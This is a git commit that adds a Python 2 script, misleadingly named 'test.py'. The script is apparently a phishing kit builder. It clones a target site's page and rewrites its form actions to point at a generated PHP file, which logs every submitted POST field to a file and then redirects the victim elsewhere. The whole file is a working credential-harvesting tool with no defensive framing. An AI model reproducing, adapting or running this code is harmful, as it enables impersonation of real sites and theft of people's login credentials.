b0bc9f8de95ea831b9bcdb43e9d55232342d0847
Saber Sebri <33780403+sabersebri@users.noreply.github.com>
2018-07-04 01:25:05 -0700

    Add files via upload

---
+++ test.py
@@ -0,0 +1,58 @@
+import urllib2
+import os
+#Created BY SABER SEBRI
+if os.name == 'nt':
+	os.system('cls')
+	os.system('color a')
+else:
+	os.system('clear')
+class bcolors:
+    OKGREEN = '\033[92m'
+    FAIL = '\033[91m'
+    ENDC = '\033[0m'
+    BOLD = '\033[1m'
+print bcolors.BOLD+'''
+
+          $$$$$$$$\ $$\           $$\        $$$$$$\            
+          $$  _____|\__|          $$ |      $$ ___$$\           
+$$\   $$\ $$ |      $$\  $$$$$$$\ $$$$$$$\  \_/   $$ | $$$$$$\  
+\$$\ $$  |$$$$$\    $$ |$$  _____|$$  __$$\   $$$$$ / $$  __$$\ 
+ \$$$$  / $$  __|   $$ |\$$$$$$\  $$ |  $$ |  \___$$\ $$ |  \__|
+ $$  $$<  $$ |      $$ | \____$$\ $$ |  $$ |$$\   $$ |$$ |      
+$$  /\$$\ $$ |      $$ |$$$$$$$  |$$ |  $$ |\$$$$$$  |$$ |      
+\__/  \__|\__|      \__|\_______/ \__|  \__| \______/ \__|      
+                                    Created BY Saber Sebri                            
+                                                                
+                                                                
+          
+
+'''
+site = raw_input("Site : ")
+login = raw_input("Name of PHP File : ")
+log = raw_input("Log File Name : ")
+redirect = raw_input("Redirect To : ")
+az = '''
+<?php
+header ('Location: %s ');
+$handle = fopen("%s", "a");
+foreach($_POST as $variable => $value) {
+    fwrite($handle, $variable);
+    fwrite($handle, "=");
+    fwrite($handle, $value);
+    fwrite($handle, "\r\n");
+}
+fwrite($handle, "===============\r\n");
+fclose($handle);
+fclose($handle);
+exit;
+?>
+'''%(redirect,log)
+sour = urllib2.urlopen(site).read()
+ar = sour.replace('action=', 'action='+login+'?')
+name = site.split('/')[2]
+os.mkdir(name, 0755)
+with open(name+'/index.html', 'a') as oo:
+	oo.write(ar)
+with open(name+'/'+login, 'a') as oo:
+	oo.write(az)
+print bcolor.BOLD+"Saved in : "+name
